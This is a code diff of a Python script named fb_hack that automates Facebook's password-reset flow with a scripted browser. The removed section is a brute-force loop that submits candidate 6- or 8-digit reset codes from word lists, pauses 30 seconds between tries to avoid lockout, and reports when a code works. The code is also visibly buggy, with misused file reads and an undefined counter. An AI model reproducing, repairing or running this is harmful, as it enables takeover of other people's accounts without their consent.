@@ -73,7 +73,8 @@ def fb_hack(email, codex):
     print("1")
     with open("output1.html", "w") as file:
       file.write(str(soup))
-    print(browser.find_link(nr=0))
+    browser.click_link(nr=0)
+    print(browser.geturl())
     sys.exit()
   browser.form['email'] = email
   browser.submit()
@@ -111,98 +112,6 @@ def fb_hack(email, codex):
     print("4")
     sys.exit()
   """reset code input"""
-  y = int(codex)
-  response1 = browser.response()
-  soup = BeautifulSoup(response1, 'html.parser')
-  test = soup.find(string="poop")
-  check1 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
-  check2 = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")
-  check3 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
-  check4 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
-  if check1 != test:
-    attempt = int(codex)
-    print(check1)
-    f = open("6digits.txt", "r")
-    attempt = int(codex)
-    while check1 != test:
-      browser.select_form(nr=0)
-      y = f.readlines(attempt)
-      attempt += 1
-      browser.form['n'] = y
-      browser.submit()
-      print(y, end='\r')
-      fail = (y, "failed")
-      success = (y, "succeded")
-      s = " "
-      with open("passcoder.txt", "a+") as z:
-        f.write(str(attempt))
-        f.close()
-      response1 = browser.response()
-      soup = BeautifulSoup(response1, 'html.parser')
-      check1 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
-      if check1 == check3:
-        print(s.join(fail))
-        count = 30
-        sleepy(count)
-      else:
-        soup = BeautifulSoup(response1, 'html.parser')
-        if soup.find(string="password_new") == test:
-          print("Password not found")
-          print(browser.geturl())
-          browser.close()
-        else:
-          print(s.join(success))
-  elif check2 != test:
-    print(check2)
-    attempt = int(codex)
-    f = open("8digits.txt", "r")
-    while check2 != check4:
-      browser.select_form(nr=0)
-      y = f.readlines(attempt)
-      attempt += 1
-      browser.form['n'] = y
-      browser.submit()
-      print(str(y), end='\r')
-      fail = (y, "failed")
-      success = (y, "succeded")
-      s = " "
-      reset -= 1
-      reset1 = reset
-      with open("passcoder.txt", "a") as z:
-        z.write(str(reset1))
-        z.close()
-      response1 = browser.response()
-      soup = BeautifulSoup(response1, 'html.parser')
-      check2 = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")
-      if check2 != test:
-        print(s.join(fail))
-        count = 30
-        sleepy(count)
-      else:
-        soup = BeautifulSoup(response1, 'html.parser')
-        if soup.find(string="password_new") == test:
-          print("Password not found")
-          print(browser.geturl())
-          print(browser.response())
-          browser.close()
-        else:
-          print(s.join(success))
-  else:
-    with open("passcoder.txt", "r") as z:
-      reset = z.readlines(-1)
-      z.close()
-    response1 = browser.response()
-    soup = BeautifulSoup(response1, 'html.parser')
-    print(browser.geturl())
-    print(response1)
-    if soup.find(string="password_new") == test:
-      print("Passcode not found")
-    elif soup.find(string="password_new") != test:
-      print("Passcode found!")
-      print(y)
-      browser.close()
-      reset = int(-1)
-  return reset, y, browser
 
 os.system('clear')
 passcode6()
